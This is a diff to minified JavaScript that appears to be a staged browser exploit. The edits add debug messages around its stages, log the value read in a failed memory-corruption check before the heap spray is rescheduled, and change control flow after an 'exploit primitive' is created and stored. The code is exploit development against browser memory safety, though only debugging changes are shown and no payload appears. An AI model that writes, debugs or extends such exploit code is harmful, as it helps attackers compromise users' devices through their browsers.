@@ -1066,11 +1066,23 @@ async function q(t, e) {
     o("");
     try {
       if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] before $()");
+      try {
+        self.postMessage({ type: 0, msg: "ct() calling $()" });
+      } catch(e) {}
       await $();
       if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] after $(); before q()");
+      try {
+        self.postMessage({ type: 0, msg: "ct() calling q()" });
+      } catch(e) {}
       await q();
       if (typeof window !== 'undefined') window.log("[STAGE1 ERROR] after q()");
+      try {
+        self.postMessage({ type: 0, msg: "ct() completed successfully, about to send type=i" });
+      } catch(e) {}
     } catch (t) {
+      try {
+        self.postMessage({ type: 0, msg: "ct() caught error: " + String(t) });
+      } catch(e) {}
       if (t === r) self.postMessage({
         type: r
       });else throw t;
@@ -1112,13 +1124,13 @@ async function q(t, e) {
           c.Us = c.Oi.Co(e[4]);
           P.platformState.exploitPrimitive = c;
           window.log("[STAGE1] u() - exploit primitive created and stored!");
-          t();
+          return;
         } catch (t) {
           window.log("[STAGE1 ERROR] u() - exception in exploit setup: " + (t && t.message));
           o(t);
         }
       } else {
-        window.log("[STAGE1] u() - corruption check failed, rescheduling spray");
+        window.log("[STAGE1] u() - corruption check failed (e[5]=" + e[5] + "), rescheduling spray");
         window.setTimeout(u, 0);
       }
     };
